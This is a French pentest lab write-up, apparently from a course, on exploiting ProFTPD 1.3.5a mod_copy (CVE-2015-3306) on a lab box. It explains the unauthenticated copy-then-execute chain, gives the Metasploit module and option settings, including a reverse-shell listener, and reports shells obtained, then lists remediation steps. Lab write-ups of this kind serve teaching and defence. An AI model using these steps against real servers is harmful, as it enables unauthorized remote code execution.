# Fiche Vulnérabilité N°02 — ProFTPD mod_copy (CVE-2015-3306)

## 1. Contexte et Identification
- **Service cible** : ProFTPD (serveur FTP alternatif)
- **Port d'écoute FTP** : `2121/tcp`
- **Port d'exécution web associé** : `8080/tcp` (Apache / PHP 7.4.3)
- **Version détectée** : `ProFTPD 1.3.5a`
- **Référence CVE** : `CVE-2015-3306`
- **Score CVSS v3** : `9.8 (Critique)` — Vecteur : `CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`
- **Cible autorisée** : ESGIS VulnBox (`10.1.0.1`)

---

## 2. Comprendre la Vulnérabilité (Explication Pédagogique)

### Pourquoi cette vulnérabilité est-elle si particulière ?
La vulnérabilité **CVE-2015-3306** est ce qu'on appelle une **attaque combinée à deux services** : elle utilise un service FTP pour déposer un fichier malveillant, puis un service Web pour l'exécuter.

### L'analogie du facteur
Imaginez que vous n'ayez pas la clé d'un appartement (le serveur web Apache). En revanche, vous parlez au gardien de l'immeuble d'à côté (le serveur FTP ProFTPD) qui a le pouvoir de déplacer n'importe quel colis dans l'immeuble voisin.
Vous demandez au gardien : *« Prenez cette enveloppe contenant du code PHP et déposez-la dans la boîte aux lettres du serveur web »*. Ensuite, vous allez sur le site web, vous ouvrez la boîte aux lettres, et le serveur web exécute le code à votre place !

### Le mécanisme technique en 4 étapes :
1. **La commande sans mot de passe** : Dans la version `1.3.5` de ProFTPD, le module optionnel `mod_copy` permet d'exécuter les commandes personnalisées `SITE CPFR` (*Copy From*) et `SITE CPTO` (*Copy To*). Le bug majeur est que **le serveur accepte ces commandes AVANT que l'utilisateur ne soit authentifié** ! N'importe quel client anonyme peut donc ordonner des copies de fichiers.
2. **L'injection de code** : Lors de la connexion au serveur FTP, on envoie une charge utile en PHP dans la commande de connexion. Cette charge utile se retrouve inscrite dans les fichiers temporaires du système (ex: `/tmp` ou les logs).
3. **La copie arbitraire (`SITE CPTO`)** : L'attaquant ordonne à ProFTPD de copier ce fichier contenant le code PHP directement dans le dossier public du serveur web Apache : `/var/www/html/payload.php`.
4. **L'exécution via HTTP** : L'attaquant envoie une simple requête web `GET http://10.1.0.1:8080/payload.php`. Le moteur PHP d'Apache lit le fichier déposé, l'exécute, et ouvre une session interactive avec l'attaquant !

---

## 3. Démarche Méthodologique & Exécution

### A. Détection initiale (Nmap)
Le scan réseau des versions (`reports/nmap-services.txt`) a mis en évidence le service suivant sur le port `2121` :
```text
PORT     STATE SERVICE VERSION
2121/tcp open  ftp     ProFTPD 1.3.5a
```

### B. Recherche du module sous Metasploit
```text
msf6 > search proftpd 1.3.5

Matching Modules
================
   #  Name                                   Disclosure Date  Rank       Check  Description
   -  ----                                   ---------------  ----       -----  -----------
   0  exploit/unix/ftp/proftpd_modcopy_exec  2015-04-22       excellent  Yes    ProFTPD 1.3.5 - 'mod_copy' Remote Command Execution
```

### C. Paramétrage spécifique
Comme l'attaque fait collaborer le service FTP (`2121`) et le service Web Apache PHP (`8080`), il a fallu configurer les deux ports distincts :
```text
msf6 > use exploit/unix/ftp/proftpd_modcopy_exec
msf6 exploit(unix/ftp/proftpd_modcopy_exec) > set RHOSTS 10.1.0.1
msf6 exploit(unix/ftp/proftpd_modcopy_exec) > set RPORT_FTP 2121
msf6 exploit(unix/ftp/proftpd_modcopy_exec) > set RPORT 8080
msf6 exploit(unix/ftp/proftpd_modcopy_exec) > set SITEPATH /var/www/html
msf6 exploit(unix/ftp/proftpd_modcopy_exec) > set LHOST 10.1.0.6
```

### D. Contrôle passif (`check`)
La commande `check` a validé que la commande de copie sans mot de passe était acceptée :
```text
[+] 10.1.0.1:8080 - The target appears to be vulnerable. 10.1.0.1:2121 - Unauthenticated SITE CPFR command was successful
```

### E. Exécution contrôlée (`run`)
La commande `run` a envoyé les instructions de copie, déposé le fichier PHP et établi deux sessions shells interactives connectées vers Kali (`10.1.0.6:4444`).

---

## 4. Preuves Réelles

### Capture d'écran 1 — Paramétrage et contrôle passif
![Configuration ProFTPD mod_copy](../../screenshots/04-vulnerabilites/02-proftpd-options.png)

### Capture d'écran 2 — Preuve technique / Sessions ouvertes (PoC)
![Sessions interactives ouvertes](../../screenshots/05-resultats/02-proftpd-session-shell.png)

### Résultat technique observé :
- Déclenchement de la copie sans authentification via `mod_copy`.
- Exécution réussie du script PHP par Apache sur le port `8080`.
- Établissement de sessions interactives actives en arrière-plan (`sessions -l`).

---

## 5. Mesures Correctives et Remédiation

- **Mise à niveau du paquet** : Mettre à jour ProFTPD vers une version sécurisée (≥ 1.3.6).
- **Désactivation immédiate du module** : Dans `/etc/proftpd/modules.conf`, commenter la ligne chargeant `mod_copy.c` :
  ```apache
  # LoadModule mod_copy.c
  ```
- **Durcissement des permissions du système de fichiers** :
  - L'utilisateur exécutant le serveur FTP ne doit avoir **aucun droit d'écriture** dans la racine web `/var/www/html/`.
  - Isoler chaque utilisateur FTP dans un dossier restreint (*chroot* / `DefaultRoot ~`).
- **Filtrage réseau** : Fermer le port alternatif `2121/tcp` au niveau du pare-feu s'il n'est pas strictement indispensable.

---
**Statut actuel** : ✅ **Validé, testé et documenté avec succès**
